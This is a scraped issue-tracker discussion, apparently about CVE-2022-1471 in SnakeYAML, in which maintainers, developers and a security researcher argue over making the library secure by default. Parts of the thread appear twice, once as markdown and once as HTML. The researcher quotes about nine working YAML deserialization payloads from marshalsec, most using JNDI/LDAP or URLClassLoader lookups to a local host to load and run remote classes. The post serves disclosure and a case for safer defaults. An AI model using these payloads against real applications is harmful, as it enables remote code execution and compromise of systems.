Please read the issue - it is still under analysis/investigation.

It only affects those who take untrusted data from unknown source - no one has presented a valid use case so far.

Those who trust false positives may try to use the proposed solution - use SafeConstructor

So as I understand, there is no migration path suggested?"

Please read the issue !!!! Where does it say anything about a hacker ???

It only concludes that a YAML may execute code. This is **intentional** - this is why people use YAML \(otherwise they may use JSON\)

The issue is incomplete ! It is still under investigation. It is only a problem for those who trust low quality tooling and their false positives."

I am too; our build job is failing because of these reports which are trully irrelevant when the only thing we’re parsing are the Spring configuration files.

Let’s think this through together.

In this example [snakeyaml / snakeyaml / src / test / resources / constructor / car-with-tags.yaml — Bitbucket](https://bitbucket.org/snakeyaml/snakeyaml/src/master/src/test/resources/constructor/car-with-tags.yaml) you can state tags. We could include, say [ContextLoader \(Spring Framework 6.0.2 API\)](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/context/ContextLoader.html) class which could generate a lot of logs in the logger. We could repeat the attack ad nausem until the disk space is full.

‌

This is just a quick idea from the top of my head."

&gt; This problem may be mitigated with the introduction of black/white instantiations lists.

I think any whitelist \(the blacklist approach would be rejected immediately by these “experts”\) would be enough so that the reports such are these are resolved and never mentioned again. It could be a global whitelist \(which I think would be scored as very safe\) or dynamic whitelist at time of instantiation according to expected property types.

Obviously this is not solving the **real** problem, but at least they won’t have any more bones to chew…

    <p>Of course there won’t be any global default whitelist. But with the whitelist ability present, Spring, and other users, could use it to allow only <code>Class</code>es which they would expect to be instantiated. I really hope it will be enough to appease the reporters of these issues.</p>
<p>I still like the property type check before calling <code>newInstance</code> or <code>constructObject</code>.</p>
<p>The blacklist I think it won’t help here much or at all.</p>

‌

&gt; It only concludes that a YAML may execute code. This is **intentional** - this is why people use YAML \(otherwise they may use JSON\)

Sorry, please help me understand, is this a part of the YAML spec? Would you be so kind as to point to the part of the spec where this is detailed?

‌

&gt; It only affects those who take untrusted data from unknown source - no one has presented a valid use case so far.

‌

I don’t know if I fully understand the question here, but let me provide you a bit of insight: untrusted user supplied data is absolutely everywhere. Even an application’s config files can be “unsafe” if, for example, a company offers running a service that parses YAML config files, as a service.

‌

If you’d like a real world example: [https://nvd.nist.gov/vuln/detail/CVE-2022-21404](https://nvd.nist.gov/vuln/detail/CVE-2022-21404)

And here is the write up about this vulnerability: [https://www.websec.ca/publication/Blog/CVE-2022-21404-Another-story-of-developers-fixing-vulnerabilities-unknowingly-because-of-CodeQL](https://www.websec.ca/publication/Blog/CVE-2022-21404-Another-story-of-developers-fixing-vulnerabilities-unknowingly-because-of-CodeQL)

&gt; As already clarified - it is only possible to execute the code which is ALREADY present in the classloader

This is mostly, true. This is why security researchers, and black hats leverage what are called deserialization gadgets to achieve remote code execution on systems with these vulnerabilities.

&gt; **Background Info:** Several object-oriented programming languages allow to serialize objects, so that they can be easily transferred and later deserialized to be processed again. Some of them trigger side effects during deserialization. In that case, special care must be taken when deserializing user-controlled data, or else _insecure deserialization_ vulnerabilities may occur. In order to exploit such a vulnerability, attackers must provide a malicious serialized object to the application. Upon deserialization, a combination of side effects performs attacker-supplied actions, similar to executing attacker-supplied code. A combination of side effects is called _gadget chain_. Gadget chains can be found by inspecting the affected application for classes that provide side effects and composing affected instances. In order to map all classes available for an exploit, it often helps to identify dependencies such as frameworks or libraries used by the vulnerable application.
&gt;
&gt; [https://blog.redteam-pentesting.de/2021/deserialization-gadget-chain/](https://blog.redteam-pentesting.de/2021/deserialization-gadget-chain/)

The `javax.script.ScriptEngineManager` is an example of a deserialization gadget chain, but I can almost guarantee you that it is not the only one that exists.

&gt; It looks like the only class which should be black listed is `javax.script.ScriptEngineManager`

As a security researcher, I would caution you about this line of thinking. Stating that “this is the only class which should be black listed” is not considering the multitude of classes that end up running within the JVM at runtime. This is why security researchers developed tools like [YSoSerial](https://github.com/frohoff/ysoserial) which is designed to look at a given classloader and build deserialization chains. If you begin using a black list, this is the bypass they will move forward with next.

&gt; the blacklist approach would be rejected immediately by these “experts”

The problem with a black list is it creates a constant game of whack-a-mole for the maintainers of this project that I can imagine you wouldn’t enjoy playing long term. This rejection is both because it’s less secure and I will save the maintainers time, effort, and energy.

# Advice

The best model for security is “secure by default”. IE. I believe that `SafeConstructor`, or something similar that does not allow arbitrary deserialization, should be the default for the `new YAML()` constructor.

‌

Allow developers to opt-out, if that’s the behaviour they desire, but the default should be secure and not allow for arbitrary code execution or deserialization to arbitrary objects. This is the model that FasterJackson followed. Arbitrary object deserialization is only allowed if you use specific annotations, or if you call `enableDefaultTyping()` \(I personally dislike this name as it’s a bit to innocuous for the security risk you introduce by calling it\). You can read more about this in the FasterJackson maintainer’s write up here: [https://cowtowncoder.medium.com/jackson-2-10-safe-default-typing-2d018f0ce2ba](https://cowtowncoder.medium.com/jackson-2-10-safe-default-typing-2d018f0ce2ba)

# Reach Out

I’ve got a lot more thoughts on this, and I’m happy to share my knowledge and experience as a security researcher with you all further. If it would be helpful, don’t hesitate to setup a call with me. I’m more than happy to sit down and have a conversation with any of you about this topic in more depth.

In order to map all classes available for an exploit, it often helps to identify dependencies such as frameworks or libraries used by the vulnerable application.</p>

</blockquote>
<p>The <code>javax.script.ScriptEngineManager</code> is an example of a deserialization gadget chain, but I can almost guarantee you that it is not the only one that exists.</p>
<blockquote>
<p>It looks like the only class which should be black listed is <code>javax.script.ScriptEngineManager</code></p>
</blockquote>
<p>As a security researcher, I would caution you about this line of thinking. Stating that “this is the only class which should be black listed” is not considering the multitude of classes that end up running within the JVM at runtime. This is why security researchers developed tools like <a data-is-external-link="true" href="https://github.com/frohoff/ysoserial" rel="nofollow">YSoSerial</a> which is designed to look at a given classloader and build deserialization chains. If you begin using a black list, this is the bypass they will move forward with next.</p>
<blockquote>
<p>the blacklist approach would be rejected immediately by these “experts”</p>
</blockquote>
<p>The problem with a black list is it creates a constant game of whack-a-mole for the maintainers of this project that I can imagine you wouldn’t enjoy playing long term. This rejection is both because it’s less secure and I will save the maintainers time, effort, and energy.</p>
<h1 id="markdown-header-advice">Advice</h1>
<p>The best model for security is “secure by default”. IE. I believe that <code>SafeConstructor</code>, or something similar that does not allow arbitrary deserialization, should be the default for the <code>new YAML()</code> constructor.</p>
<p>‌</p>
<p>Allow developers to opt-out, if that’s the behaviour they desire, but the default should be secure and not allow for arbitrary code execution or deserialization to arbitrary objects. This is the model that FasterJackson followed. Arbitrary object deserialization is only allowed if you use specific annotations, or if you call <code>enableDefaultTyping()</code> (I personally dislike this name as it’s a bit to innocuous for the security risk you introduce by calling it). You can read more about this in the FasterJackson maintainer’s write up here: <a data-is-external-link="true" href="https://cowtowncoder.medium.com/jackson-2-10-safe-default-typing-2d018f0ce2ba" rel="nofollow">https://cowtowncoder.medium.com/jackson-2-10-safe-default-typing-2d018f0ce2ba</a></p>
<h1 id="markdown-header-reach-out">Reach Out</h1>
<p>I’ve got a lot more thoughts on this, and I’m happy to share my knowledge and experience as a security researcher with you all further. If it would be helpful, don’t hesitate to setup a call with me. I’m more than happy to sit down and have a conversation with any of you about this topic in more depth. <a data-is-external-link="true" href="https://calendly.com/jonathan-leitschuh-at-dan-kaminsky-fellowship" rel="nofollow">https://calendly.com/jonathan-leitschuh-at-dan-kaminsky-fellowship</a></p>

I looked at the research done by Moritz Bechler back in 2017 regarding achieving remote code execution via unmarshallers, like SnakeYaml. \(For reference, this paper can be found here: [https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec)\).

I just want to make you aware that his tool, marshalsec, already has additional gadget chains for SnakeYaml that can allow an attacker to achieve remote code execution:

For `SpringPropertyPathFactory`

```yaml
!!org.springframework.beans.factory.config.PropertyPathFactoryBean
  targetBeanName: &quot;ldap://localhost:1389/obj&quot;
  propertyPath: foo
  beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory
    shareableResources: [&quot;ldap://localhost:1389/obj&quot;]
```

‌

For `SpringAbstractBeanFactoryPointcutAdvisor`:

```yaml
set:
  ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor
    adviceBeanName: &quot;ldap://localhost:1389/obj&quot;
    beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory
      shareableResources: [&quot;ldap://localhost:1389/obj&quot;]
  ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor []
```

‌

For `XBean`:

```yaml
!!javax.management.BadAttributeValueExpException [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [&quot;foo&quot;, !!javax.naming.Reference [foo, &quot;Exploit&quot;, &quot;http://localhost:8080/&quot;], !!org.apache.xbean.naming.context.WritableContext []]]
```

‌

For `CommonsConfiguration`:

```yaml
set:
  ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], &quot;ldap://localhost:1389/obj&quot;]]
```

‌

For `C3P0WrapperConnPool`:

```yaml
!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource
  userOverridesAsString: &quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;&quot;
```

‌

For `C3P0RefDataSource` :

```yaml
!!com.mchange.v2.c3p0.JndiRefForwardingDataSource
  jndiName: &quot;ldap://localhost:1389/obj&quot;
  loginTimeout: 0
```

‌

For `JdbcRowSet`:

```yaml
!!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: &quot;ldap://localhost:1389/obj&quot;
  autoCommit: true
```

‌

For `ScriptEngine`:

```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://localhost:8080/&quot;]]]]
```

‌

For `ResourceGadget`:

```yaml
[!!org.eclipse.jetty.plus.jndi.Resource [&quot;__/obj&quot;, !!javax.naming.Reference [&quot;foo&quot;, &quot;Exploit&quot;, &quot;http://localhost:8080/&quot;]], !!org.eclipse.jetty.plus.jndi.Resource [&quot;obj/test&quot;, !!java.lang.Object []]]
```

‌

Many of these payloads are leveraging JNDI, to force an LDAP connection that downloads and then executes an arbitrary class file on the JVM. This is very similar to how the famed Log4Shell exploit \(CVE-2021-44228\) worked.

‌

To reiterate what I said above, researchers and black hats will find more payloads like these ones. The best defense, as the Log4J team also discovered, was to disable the feature by default and allow organizations to enable the risky feature on a case-by-case basis, allowing them to intentionally accept the risk associated with that decision."

<p>Many of these payloads are leveraging JNDI, to force an LDAP connection that downloads and then executes an arbitrary class file on the JVM. This is very similar to how the famed Log4Shell exploit (CVE-2021-44228) worked.</p>
<p>‌</p>
<p>To reiterate what I said above, researchers and black hats will find more payloads like these ones. The best defense, as the Log4J team also discovered, was to disable the feature by default and allow organizations to enable the risky feature on a case-by-case basis, allowing them to intentionally accept the risk associated with that decision.</p>

DevSecsOps screams ‘fix it’ and as a developer, we immediately have three levels of management watching us and asking us how it is going.   No one wants this.

All of that is what leads people to recommend “Secure By Default”.   If you are selling people a loaded gun, put the safety on for them, and teach them how to turn it off if they need to.  Most won’t need to.  From a CVE perspective, that means they have to document a whole bunch more things that someone would have to do to trigger the vulnerability, and that gives folks \(like me\) the ammunition to say “we are not impacted” and avoid coming to the library to check for a solution.  
  
Lastly, heartfelt thank you for all you do.  I mean it.  Thanks for reading."

From a CVE perspective, that means they have to document a whole bunch more things that someone would have to do to trigger the vulnerability, and that gives folks (like me) the ammunition to say “we are not impacted” and avoid coming to the library to check for a solution.  </p>
<p>Lastly, heartfelt thank you for all you do.  I mean it.  Thanks for reading.</p>

         data-content="&gt; 100% of the application which use SnakeYAML do not parse data from untrusted sources.

Unfortunately, this is not the case. Since my post 4 days ago, I have found at least two projects, one with 700\+ stars on GitHub, and the other with over 5,000. Both have remotely exploitable RCE vulnerabilities because of this exploit vector. I was able to work with someone from the GitHub Security Lab to create a POC and will be reporting to those projects shortly.

Here’s a third case where Oracle issued a CVE due to this exact vulnerability appearing in one of their applications: CVE-2022-21404 [https://www.websec.ca/publication/Blog/CVE-2022-21404-Another-story-of-developers-fixing-vulnerabilities-unknowingly-because-of-CodeQL](https://www.websec.ca/publication/Blog/CVE-2022-21404-Another-story-of-developers-fixing-vulnerabilities-unknowingly-because-of-CodeQL)

Here are some other cases too:

| **CVE** | **Project** | **GitHub Stars** |
| --- | --- | --- |
| CVE-2022-31691 | STS4 extensions for Eclipse and VSCode | 698 |
| CVE-2021-41110 | cwlviewer | 37 |
| CVE-2021-21249OneDev | OneDev | 10,500 |
| CVE-2020-1947 | Apache ShardingSphere | 17,800 |
| CVE-2016-8744 | Apache Brooklyn | 132 |

&gt; The solution may be proposed to the libs which allow remote code execution \(the list is above\). These libs may introduce “secure by default“.

Some of them have in the past. However, I want to share with you a quote form Moritz Bechler who wrote the 2017 paper “[Java Unmarshaller Security: Turning your data into code execution](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)”:

&gt; People tend to be looking for someone to blame. Should a hashCode\(\)/equals\(\) or a property accessor implementation invoke any code with possible side effects?76 While that might be bad style in general, it may be necessary to get correct behavior in others. Should an unmarshaller assume that all types follow some implicit contract? Probably not, but without any form of contract there is not much they could do. Should developers be more concerned with the security implications of technologies they use, including actually reading warnings in the documentation, and less with their convenience? Certainly.
&gt;
&gt; For Java Serialization \(3.2.1\) we have seen some libraries, namely commons-collections and groovy, “fixing” gadgets in their code. It’s the author’s opinion that this was a bad choice, leaving many exploitable instances as the fundamental problem often remained unfixed. Also, in many cases, it is not even possible to implement such mitigations for the mechanisms described in this paper as there is no way a type could prevent its own unmarshalling.

‌

&gt; These libs may introduce “secure by default“.

In my opinion, and the opinion of Effective Java, constructors should do no, or minimal, work. I believe that the argument you are making is that these constructors are badly behaving by performing actions beyond the simple act of constructing an object.

‌

That being said, some of these payloads don’t leverage the behaviour of the constructor to achieve RCE. Take for example this payload:

```
set:
  ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], &quot;ldap://localhost:1389/obj&quot;]]
```

This leverages the behaviour that when adding an item to a set the following chain of calls occur:

```

```

This call chain is possible, not because of a misbehaving constructor, but because SnakeYaml calls `hashCode` on an untrusted object, leading to remote code execution.

‌

My question to you, @{557058:26b2b144-0865-42ea-ab97-e718812c8217} , is how do you propose that library authors defend against this attack vector? Keeping in mind that SnakeYAML intentionally bypasses declared access modifiers on constructors and setter methods by intentionally calling `setAccessible(true)` \([link](https://bitbucket.org/snakeyaml/snakeyaml/src/1d2c1cd365774876e8c7c63eace7e906c0aca2bf/src/main/java/org/yaml/snakeyaml/constructor/Constructor.java#lines-591)\) to allow access to `private`, `protected` and package-private methods.

‌

Again, I’m more than happy to sit down and have a deeper conversation with you on this. Please don’t hesitate to schedule some time on my calendar. [https://calendly.com/jonathan-leitschuh-at-dan-kaminsky-fellowship](https://calendly.com/jonathan-leitschuh-at-dan-kaminsky-fellowship)"

<p>Unfortunately, this is not the case. Since my post 4 days ago, I have found at least two projects, one with 700+ stars on GitHub, and the other with over 5,000. Both have remotely exploitable RCE vulnerabilities because of this exploit vector. I was able to work with someone from the GitHub Security Lab to create a POC and will be reporting to those projects shortly.</p>
<p>Here’s a third case where Oracle issued a CVE due to this exact vulnerability appearing in one of their applications: CVE-2022-21404 <a data-is-external-link="true" href="https://www.websec.ca/publication/Blog/CVE-2022-21404-Another-story-of-developers-fixing-vulnerabilities-unknowingly-because-of-CodeQL" rel="nofollow">https://www.websec.ca/publication/Blog/CVE-2022-21404-Another-story-of-developers-fixing-vulnerabilities-unknowingly-because-of-CodeQL</a></p>

<p>The solution may be proposed to the libs which allow remote code execution (the list is above). These libs may introduce “secure by default“.</p>
</blockquote>
<p>Some of them have in the past. However, I want to share with you a quote form Moritz Bechler who wrote the 2017 paper “<a data-is-external-link="true" href="https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true" rel="nofollow">Java Unmarshaller Security: Turning your data into code execution</a>”:</p>
<blockquote>
<p>People tend to be looking for someone to blame. Should a hashCode()/equals() or a property accessor implementation invoke any code with possible side effects?76 While that might be bad style in general, it may be necessary to get correct behavior in others. Should an unmarshaller assume that all types follow some implicit contract? Probably not, but without any form of contract there is not much they could do. Should developers be more concerned with the security implications of technologies they use, including actually reading warnings in the documentation, and less with their convenience? Certainly.</p>
<p>For Java Serialization (3.2.1) we have seen some libraries, namely commons-collections and groovy, “fixing” gadgets in their code. It’s the author’s opinion that this was a bad choice, leaving many exploitable instances as the fundamental problem often remained unfixed. Also, in many cases, it is not even possible to implement such mitigations for the mechanisms described in this paper as there is no way a type could prevent its own unmarshalling.</p>
</blockquote>
<p>‌</p>
<blockquote>
<p>These libs may introduce “secure by default“.</p>
</blockquote>
<p>In my opinion, and the opinion of Effective Java, constructors should do no, or minimal, work. I believe that the argument you are making is that these constructors are badly behaving by performing actions beyond the simple act of constructing an object.</p>
<p>‌</p>
<p>That being said, some of these payloads don’t leverage the behaviour of the constructor to achieve RCE. Take for example this payload:</p>
<div class="codehilite"><pre><span></span><code><span class="c">set:</span>
<span class="c">  ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], &quot;ldap://localhost:1389/obj&quot;]]</span>
</code></pre></div>

<p>This leverages the behaviour that when adding an item to a set the following chain of calls occur:</p>

Is there some context I’m missing that I could review to better understand your perspective on this problem? I want to understand what constraints you’re working under so we can both secure end users and not diminish the power that this library unlocks for other users."

I get it. You are freely maintaining this amazing software that is used all over the place, including for Spring, and you don’t want to jump through hoops because so many companies are setting up bureaucracies around this.

I’m just saying, if you show a business something like this whitelist concept and tell them it’s because bad yaml files can remotely execute code and that is a CVE level 10 security breach, they are not going to trust developers with that whitelist. I’m imagining a scenario where I can’t add a custom yaml file to Spring without asking DevOps or whichever team is handling security. Maybe if I understood the situation with your code better, I wouldn’t think that’s possible. I’m just saying, please consider the bureaucracy that many developers do have to deal with because this is a major headache for us, and we usually cannot convince the businesses we work for not to get rid of the “low quality tooling and false positives.” These CVE’s come from a highly accredited government sponsored organization that tracks all publicly known security vulnerabilities and the “low quality tooling” trusts whatever they say. CVE is the one with the “false positive.” They either need to be convinced this issue has been resolved with a new version or they need to be convinced that this is not a security a vulnerability to begin with, which I’m guessing will be very hard to do."

         data-content="Hey Daryl,

Thank you for your long-ish input on the topic. 

I think if it was not clear before that now it is clear to everyone that compliance is hard in large organizations. I do belong to such organization myself. 

However, large organizations operate for profit. That’s why I am a member of my organization. I’m guessing you are not volunteering in your organization? 

I am sure if you remember the RCE topic in Spring \(I also had to sanitize the Sonatype report because of the CVE taking away my precious time\) that you remember another RCE - **Log4shell**. That was quite an earthquake. Do you know what is the biggest problem with log4shell? That the amount of damage that it caused is **unknown.** After Heartbleed and all others - log4shell showed that the approach of being secure first is actually - **cheaper** for large organizations \(but honestly for organization of any size\). The damage that single RCE leak can cause is immeasurably larger than lost dev hours or days. 

‌

So, I do feel that you’ve had had headaches due to security issues being thrown your way. I am in the same boat. But trust me - a single exploitable RCE could mean that your company could lose money, clients or even get locked altogether. So many more people would get headaches. 

I hope you can understand that."

<p>I am sure if you remember the RCE topic in Spring (I also had to sanitize the Sonatype report because of the CVE taking away my precious time) that you remember another RCE - <strong>Log4shell</strong>. That was quite an earthquake. Do you know what is the biggest problem with log4shell? That the amount of damage that it caused is <strong>unknown.</strong> After Heartbleed and all others - log4shell showed that the approach of being secure first is actually - <strong>cheaper</strong> for large organizations (but honestly for organization of any size). The damage that single RCE leak can cause is immeasurably larger than lost dev hours or days. </p>
<p>‌</p>
<p>So, I do feel that you’ve had had headaches due to security issues being thrown your way. I am in the same boat. But trust me - a single exploitable RCE could mean that your company could lose money, clients or even get locked altogether. So many more people would get headaches. </p>
<p>I hope you can understand that.</p>

Is there a reason the Constructor\(\) could not simply be hollowed out and redirected into the SafeConstructor\(\) for backwards compatibility’s sake?

If by “low quality tooling“ you refer to things like OWASP Dependency Check then I think it’s highly unfair to discredit them. The tools or their output can only ever be as good as the data they operate upon. If a CVE in the NVD is “low quality” then it can’t be the fault of a tool to report upon it. Don’t shoot the messenger they say."

The tools or their output can only ever be as good as the data they operate upon. If a CVE in the NVD is “low quality” then it can’t be the fault of a tool to report upon it. Don’t shoot the messenger they say.</p>

1. CVE and NIST are no low quality tooling. This is a source for the information for those who understands it \(I got now why the Bible was not allowed to be read by everyone\)
2. CVE and NIST are the messenger \(Don’t shoot the messenger\)
3. Low quality tooling is the reason you are here. It is a tool which pretends that it uses CVE to warn users. They ignore the most important part of CVE - the context. They create noise \(false positives\) based solely on the name and version of the library/package.
4. The community should be aware that the low quality tooling is **confusing on purpose**. This is the way to show its importance to earn money.

         data-content="&gt; Dear Jonathan Leitschuh, why not to jump in and and expain basic things ? \(many !!!\)

Sorry, I don’t understand what you’re trying to communicate here. Would you be so kind as to elaborate? Is there a resource I can read, or an existing email thread that contains the context? I can understand why you may not want to reiterate what you’ve stated before to others, and I’m happy to read previous communications you may have had with others on this topic.

‌

&gt; Dear Daryl, if you do not see the difference between a CVE issue \(which is not a false positive\), and the noise from low quality tooling \(false positives\) I cannot help you. I hope Jonathan should clearly show the difference.

Let me see what I can do. To be clear, this is my assessment of how the world, including the CVE system currently works. Is it perfect, no, but it’s what we have to communicate to the world that a project is, in some way, vulnerable.

&gt; Low quality tooling is the reason you are here. It is a tool which pretends that it uses CVE to warn users. They ignore the most important part of CVE - the context. They create noise \(false positives\) based solely on the name and version of the library/package.
&gt;
&gt; The community should be aware that the low quality tooling is **confusing on purpose**. This is the way to show its importance to earn money.

Trying to encode this context into a detector is an incredibly complex task. Most tooling just looks at the dependency graph and compares that against the list of open CVEs, and will fire off an alert if the vulnerable version is detected. This is what you would consider “low quality tooling”.

I presume your “high quality tooling” would do something like walk the source code, and then attempt to determine if the code calling SnakeYaml is done so in a way that is safe or not. To be clear, this is an incredibly complex problem. It would involve looking at a program’s data flow, control flow, not just in your application code, but in ever single dependency and transitive dependency to determine if this code is called in an insecure way or not. I believe that there are one, maybe two companies that attempt to do this, but it is an incredibly difficult problem to solve.

Unfortunately, the way the CVE system is integrated into a majority of systems is that a CVE is assigned to a vulnerable version range. When the CVE is “all versions are vulnerable” or, “there is no fix possible through just an upgrade”, the tooling that the industry has built breaks down and maintainers, like yourself, Andrey, end up in issue threads like this. I’ve seen this before.

This is the core reason why security practitioners push for the model of “secure by default”. Because then, in a majority of cases, the fix, and the easiest way to resolve a CVE, is just to update a dependency. I can guarantee that you that doing so will save yourself, and your end users, a significant amount of cycles dealing with this problem on this version, and all future releases. SnakeYAML should change the default to be secure.

To quote Jeff Bennett from above: “if you are selling people a loaded gun, put the safety on for them, and teach them how to turn it off if they need to.”

---

Andrey, many of the arguments you originally shared for why this feature has remained enabled by default have been rebutted:

&gt; The issue is incomplete ! It is still under investigation.

The issue is no longer under investigation and has been assigned a severity of 9.8/10 by the NVD.

&gt; it may only execute code which is already present in your classloader.

I provided a long list of payloads that allow an attacker to achieve remote code execution [here](https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64586004).

&gt; It is only a problem for those who trust low quality tooling and their false positives.

This has been a long-term problem, with a long history of OSS projects having to assign CVEs because of the RCE vulnerability SnakeYAML exposes when developers don’t understand the default configuration of SnakeYAML allows them to shoot themselves in the foot. See the list of[ CVEs I created above](https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64599072).

&gt; 100% of the application which use SnakeYAML do not parse data from untrusted sources. It means “secure by default“ will satisfy the low quality tooling and not the community

Again, see the list of[ CVEs I created above](https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64599072). I’ve also reported two additional vulnerabilities to OSS projects. I’ve started a 90-day disclosure timeline with them both.

&gt; which has to suffer a lot because of the breaking backwards-incompatible changes to support quasi “secure“ feature

This is why semver has the major version number. To indicate an API breaking change. I think this is a completely valid use case for revving this number. It’s not a bad thing to have to do so when the result is improved security for your end users.

‌

&gt; It only concludes that a YAML may execute code. This is intentional - this is why people use YAML \(otherwise they may use JSON\)

Above I asked the following question to which, I haven’t seen a response: “[Sorry, please help me understand, is this a part of the YAML spec? Would you be so kind as to point to the part of the spec where this is detailed?](https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64581479)”

‌

I understand that, as an open source software maintainer, you don’t owe anyone anything. The features you develop, choose to keep in, or disable, are your choice. But I would encourage you to think about the security of your end users software and the amount of damage that can be caused by your end users unintentionally feeding untrusted user input into SnakeYAML in it’s default, insecure, configuration, purely because they don’t understand the security ramifications of that decision."

It seems that RedHat’s RestEasy was leveraging SnakeYaml to parse requests with the content types of `text/yaml` `text/x-yaml` &amp; `application/x-yaml`. RestEasy is a JBoss framework for creating Jakarta RESTful Web Services, and has over 1k stars on GitHub.

         data-content="&gt; 100% of the application which use SnakeYAML do not parse data from untrusted sources.

I’m honestly baffled by this claim. This CVE and the so called “low quality tooling” pointed us to a huge security issue in our application. We use SnakeYaml to parse somewhat complex configuration files and while those can only be accessed by admins of the application, that does not mean that they are trusted to execute arbitrary code on a production system. I acknowledge this was our mistake to not just use the SafeConstructor plus our own Tags, but we did not expect that such a huge security issue would be the default. Our bad. And I doubt that we are the only ones making this mistake.

In my opinion the classification of the CVE is entirely correct and it should remain active until a secure by default behavior is established. The best and easiest option here would be to have to default to the SafeConstructor only and have a warning in the documentation about using the current default Constructor class. Writing your own whitelist is then easy enough by providing your own Constructor if you do not want to support this out of the box."

It means “secure by default“ will satisfy the low quality tooling and not the community \(which has to suffer a lot because of the breaking backwards-incompatible changes to support quasi “secure“ feature\)

# Intro

Hi there, I am an application developer that parses untrusted YAML from untrusted users \(greater than 10k users providing untrusted YAML\). I develop a CICD solution for Jenkins \(Jervis Jenkins as a service\) which has a company self service onboarding model. The Jenkins infra has over 50k jobs in a single Jenkins controller and over 4k users in a single Jenkins controller. I’ll share my perspective on this:

# My pains with SnakeYAML as an application developer

SnakeYAML has been a challenge to work with. I found a while a go my application to be insecure after static analysis tools like SonarQube and dependency analysis tools like DependencyTrack flagged my application as vulnerable. I had to painstakingly go through all of the places I use SnakeYAML and initialize with SafeConstructor.

Additionally, `new SafeConstructor()` has been deprecated so again I had to go through all of my application code to stop using a deprecated constructor \(a second time in all similar places\).

I’ve decided to centralize all YAML operations into a [static YamlOperator class](https://github.com/samrocketman/jervis/blob/main/src/main/groovy/net/gleske/jervis/tools/YamlOperator.groovy). Design choices of SnakeYAML is forcing me to make design choices I wouldn’t normally make.

My journey doesn’t end there. I have Jenkins infrastructure that is also using its own YAML processing \(pipeline code\) and Jenkins plugins that is doing its YAML processing using SnakeYAML. From my perspective, I’ve wasted engineering cycles that would have been avoided if SnakeYAML took a secure by default approach.

When I started using SnakeYAML purely for its processing of YAML text I did not know that it was a full Java object marshaller and unmarshaller.

Hopefully, you’ll change your mind on sane defaults even if you feel the need to bump the major version for a new release.

# Summary

As far as I can tell, using SnakeYAML for marshal and unmarshal in Java is very niche and not something I’ve encountered often professionally. Nearly all uses of SnakeYAML I’ve found use it purely for its text processing capabilities of static YAML \(and features of YAML like anchors and aliases\).

Please take a secure by default approach"

<p>Additionally, <code>new SafeConstructor()</code> has been deprecated so again I had to go through all of my application code to stop using a deprecated constructor (a second time in all similar places).</p>
<p>I’ve decided to centralize all YAML operations into a <a data-is-external-link="true" href="https://github.com/samrocketman/jervis/blob/main/src/main/groovy/net/gleske/jervis/tools/YamlOperator.groovy" rel="nofollow">static YamlOperator class</a>. Design choices of SnakeYAML is forcing me to make design choices I wouldn’t normally make.</p>
<p>My journey doesn’t end there. I have Jenkins infrastructure that is also using its own YAML processing (pipeline code) and Jenkins plugins that is doing its YAML processing using SnakeYAML. From my perspective, I’ve wasted engineering cycles that would have been avoided if SnakeYAML took a secure by default approach.</p>
<p>When I started using SnakeYAML purely for its processing of YAML text I did not know that it was a full Java object marshaller and unmarshaller.</p>
<p>Hopefully, you’ll change your mind on sane defaults even if you feel the need to bump the major version for a new release.</p>
<h1 id="markdown-header-summary">Summary</h1>
<p>As far as I can tell, using SnakeYAML for marshal and unmarshal in Java is very niche and not something I’ve encountered often professionally. Nearly all uses of SnakeYAML I’ve found use it purely for its text processing capabilities of static YAML (and features of YAML like anchors and aliases).</p>
<p>Please take a secure by default approach</p>

Your abrasive attitude and lack of willingness to work with the multitude of incredibly smart people in this thread that are offering explanations, use case scenarios, and immensely helpful suggestions, is unprofessional and uncharacteristic of open source development collaboration.

1. Can you please provide the link to your project of the name of the company ? I am afraid you do not take data from untrusted source. Your users must authenticate to send the data \(according to what I read in your post\)
2. I do not understand why the deprecation of the `new SafeConstructor()`becomes a topic here. It is totally unrelated to this discussion. The code changes - it is natural. It will be changed later as well.
